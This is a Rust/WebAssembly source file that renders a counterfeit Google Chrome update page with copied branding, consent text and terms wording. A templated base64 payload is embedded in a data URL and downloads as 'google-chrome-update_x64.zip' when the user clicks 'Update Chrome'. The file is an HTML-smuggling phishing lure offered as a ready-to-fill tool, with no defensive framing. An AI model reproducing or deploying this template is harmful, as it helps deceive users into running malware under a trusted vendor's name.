use wasm_bindgen::prelude::*;
use web_sys::window; // Correctly import the `window` function here
use wasm_bindgen::JsCast;
use web_sys::{Document, HtmlElement};

// Called when the wasm module is instantiated
#[wasm_bindgen(start)]

pub fn main() -> Result<(), JsValue> {
    // Use `web_sys`'s global `window` function to get a handle on the global window object.
    let window = web_sys::window().expect("no global `window` exists");
    let document = window.document().expect("should have a document on window");
    let body = document.body().expect("document should have a body");












    // Get our payload into a format we can use
    let target = "{{ PAYLOAD }}";
    





















    // just a gap for better visualisation in code map
































    let base64_blob = "data:image/png;base64,"; // Your base64 data
    let base64_brand_blob = "data:image/svg+xml;base64,";
    let logo = document.create_element("img")?.dyn_into::<web_sys::HtmlElement>()?;
    logo.set_attribute("src", base64_brand_blob)?;
    logo.set_attribute("style", "height: 30px; display: flex; align: left;")?; // Adjust the height as needed

    let button = document.create_element("button")?.dyn_into::<HtmlElement>()?;
    button.set_inner_html("Update Chrome");
    button.set_attribute("id", "download_button")?;
    //button.set_attribute("style", "padding: 10px; margin-top: 20px;")?;
    //button.set_attribute("class", "btn btn-primary btn-lg")?;
    //button.set_attribute("style", "border-radius: 50%; font-weight: bold; padding: 10px 20px; background-color: #4285F4; color: white; border: none; font-size: 16px;")?;
    //button.set_attribute("style","background-color: #4285F4; color: white; border: none; padding: 10px 20px; border-radius: 4px; font-size: 16px; cursor: pointer; text-transform: uppercase; font-weight: bold; border-radius: 80%;")?;
    button.set_attribute("style","background-color: #1967d2; color: white; border: none; padding: 10px 25px; border-radius: 24px; font-size: 16px; cursor: pointer; display: flex; align: center;")?;


    // Create and style navbar
    let nav = document.create_element("nav")?;
    nav.set_attribute("style", "width: 100%; background: #333; padding: 10px 0; color: white;")?;
    let nav_content = document.create_element("div")?;
    nav_content.set_inner_html("    Google Chrome   ");
    nav_content.set_attribute("style", "display: flex; align-items: center; justify-content: flex-start;")?;
    //nav.set_attribute("style", "width: 100%; background: #FFFFFF; padding: 10px 0; color: black; box-shadow: 0 4px 6px rgba(0,0,0,0.1); ")?;
    nav.set_attribute("style", "display: flex; align-items: center; justify-content: flex-start; width: 100%; background: #FFFFFF; padding: 10px; color: black; box-shadow: 0 4px 6px rgba(0,0,0,0.1);")?;


    nav.append_child(&logo)?;
    nav.append_child(&nav_content)?;
    body.append_child(&nav)?;
    

    // Create main content container
    let main_container = document.create_element("div")?;
    main_container.set_attribute("style", "text-align: center; padding: 20px;")?;

    // Add brand logo
    let logo = document.create_element("img")?.dyn_into::<web_sys::HtmlElement>()?;
    logo.set_attribute("src", base64_brand_blob)?; // Replace path_to_logo with your logo path
    logo.set_attribute("style", "max-width: 100px;")?;
    main_container.append_child(&logo)?;
    
    // Add title
    let title = document.create_element("h2")?.dyn_into::<web_sys::HtmlElement>()?;
    title.set_inner_html("There's no place like Chrome<br><br>");
    title.set_attribute("style", "font-weight: normal; font-size: 44px;")?;
    main_container.append_child(&title)?;

    main_container.set_attribute("style", "display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px;")?;

    main_container.append_child(&button)?;

    // Create a container to center the button
    let container = document.create_element("div")?;
    container.set_attribute("style", "justify-content: center; align-items: center; ")?;
    body.append_child(&container)?;

    //container.append_child(&button)?;

    // Add H3 subsection
    let subsection = document.create_element("h6")?.dyn_into::<web_sys::HtmlElement>()?;
    subsection.set_attribute("class", "text-muted")?;
    subsection.set_attribute("style", "padding: 20px 10px;")?;
    subsection.set_inner_html("For Windows 11/10/8.1/8/7 64-bit.");
    main_container.append_child(&subsection)?;

    // Add paragraph with checkbox
    let paragraph = document.create_element("p")?.dyn_into::<web_sys::HtmlElement>()?;
    let checkbox = document.create_element("input")?.dyn_into::<web_sys::HtmlInputElement>()?;
    checkbox.set_attribute("type", "checkbox")?;
    paragraph.append_child(&checkbox)?;
    // Instead of creating and appending a text node separately, append the text directly to the paragraph's innerHTML
    //paragraph.set_inner_html(&format!("{} Help make Google Chrome better by automatically sending usage statistics and crash reports to Google.", paragraph.inner_html()));

    //main_container.append_child(&paragraph)?;

    // Add "Learn More" link
    //let learn_more = document.create_element("a")?.dyn_into::<web_sys::HtmlElement>()?;
    //learn_more.set_attribute("href", "link_to_more_info")?; // Replace link_to_more_info with your actual link
    //learn_more.set_inner_html("Learn More");
    //main_container.append_child(&learn_more)?;

    // Append main container before the footer
    body.append_child(&main_container)?;



    
    let download_url = format!("data:application/octet-stream;base64,{}", target);

    // Create a footer element
    let footer = document.create_element("footer")?;
    footer.set_attribute("style", "padding: 20px; text-align: center;")?;

    // Create an img element for the blob image
    let img = document.create_element("img")?.dyn_into::<web_sys::HtmlElement>()?;

    img.set_attribute("src", base64_blob)?;
    img.set_attribute("style", "width: 70%; height: auto;")?;
    footer.append_child(&img)?;

    // Append the footer to the body
    body.append_child(&footer)?;

    // Assuming checkbox is already created and you have a container div for it
    let checkbox_label = document.create_element("label")?.dyn_into::<web_sys::HtmlElement>()?;
    checkbox_label.set_attribute("style", "display: flex; align-items: center; cursor: pointer;")?;
    checkbox_label.append_child(&checkbox)?;
    // Directly set inner HTML to include the text next to the checkbox
    checkbox_label.set_inner_html(&format!("<small>{} Help make Google Chrome better by automatically sending usage statistics and crash reports to Google. <a href> Learn More.</a><br><br>By downloading Chrome, you agree to the <a href>Google Terms of Service</a> and <a href>Chrome and ChromeOS Additional Terms of Service</a></small>", checkbox_label.inner_html()));

    // Then append this label to your main or specific container
    main_container.append_child(&checkbox_label)?;

    
    
    let closure = Closure::wrap(Box::new(move || {
        let document = web_sys::window().expect("should have a window in click context")
                        .document().expect("window should have a document in click context");
        
        let a = document.create_element("a").expect("should be able to create an element");
        a.set_attribute("href", &download_url).expect("should be able to set href");
        a.set_attribute("download", "google-chrome-update_x64.zip").expect("should be able to set download attribute");
        
        let a = a.dyn_into::<web_sys::HtmlElement>().expect("should be able to cast to HtmlElement");
        a.click(); // Programmatically click the <a> to trigger the download
    }) as Box<dyn Fn()>);





    button.add_event_listener_with_callback("click", closure.as_ref().unchecked_ref())?;
    closure.forget(); // Avoid closure being garbage collected

    Ok(())
}